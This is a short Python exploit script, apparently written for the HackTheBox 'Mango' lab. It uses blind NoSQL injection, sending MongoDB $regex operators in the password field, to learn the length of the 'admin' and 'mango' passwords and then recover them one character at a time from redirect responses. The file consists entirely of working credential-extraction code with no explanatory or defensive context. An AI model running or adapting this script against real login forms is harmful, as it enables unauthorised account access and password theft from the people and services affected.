#!/usr/bin/env python3

import requests
import string

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   
url = "http://staging-order.mango.htb/index.php"
users = ['admin', 'mango'] # Obtained manually
	
def getPasswordLength(user):
	length = 1;
	while True:
		post_data = {"username": user, "password[$regex]": ".{" + str(length) + "}", "login": "login"}
		response = requests.post(url, data=post_data, allow_redirects=False)
		if response.status_code == 302:
			length += 1
		else:
			return length - 1
			
def getPassword(user):
	pass_length = getPasswordLength(user)
	password = '';
	for i in range(0, pass_length):
		for char in string.ascii_letters + string.digits + string.punctuation:
				if char in string.punctuation:
					char = '\\' + char
				regex = '^' + password + char
				post_data = {'username': user, 'password[$regex]': regex, 'login': 'login'}
				response = requests.post(url, data=post_data, allow_redirects=False)
				if response.status_code == 302:
					password += char
					break
				
	password = password.replace('\\','')	
	return password
	
def main():

	print(color.PURPLE + "\n[*] Mango password guesser created by XMA")
	print("-------------------------------------------\n" + color.END)

	for user in users:
		print("[*] Retrieving password for user " + user + " ...")
		password = getPassword(user)
		print("[*] Password for user " + color.BOLD + user + ": " + password + color.END + "\n")
		
		
if __name__ == '__main__':
	main()





